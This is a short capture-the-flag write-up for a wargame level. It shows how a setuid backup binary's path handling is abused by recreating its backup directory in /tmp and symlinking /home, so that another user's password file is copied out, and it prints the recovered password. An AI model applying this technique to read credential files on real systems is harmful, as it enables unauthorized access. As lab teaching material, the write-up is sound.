## Level08

First, I disassembled the executable and converted it into easy-to-understand C code (see `source.c`).
</br>
Now, looking at the executable, it's clear that it opens and copies the target file.
</br>
There are issues with the way it works because of the `//`.

```bash
$ ./level08 /home/users/level09/.pass
ERROR: Failed to open ./backups//home/users/level09/.pass
```
We cannot create a symbolic link to `/home/users/level09/.pass` or in the home directory (`~`).
</br>
So we'll do it in /tmp.

To avoid any issues, we need to recreate the `backup` folder, the `.log` file, and set the target path to `.pass`.
</br>
You also need to create a symbolic link to the `/home` directory

```bash
$ cd /tmp
$ mkdir -p backups/home/users/level09
$ touch backups/.log
$ ln -s /home home
$ ~/level08 home/users/level09/.pass
```

And there you go.

```bash
$ cat backups/home/users/level09/.pass
fjAwpJNs2vvkFLRebEvAQ2hFZ4uQBWfHRsP62d8S
```
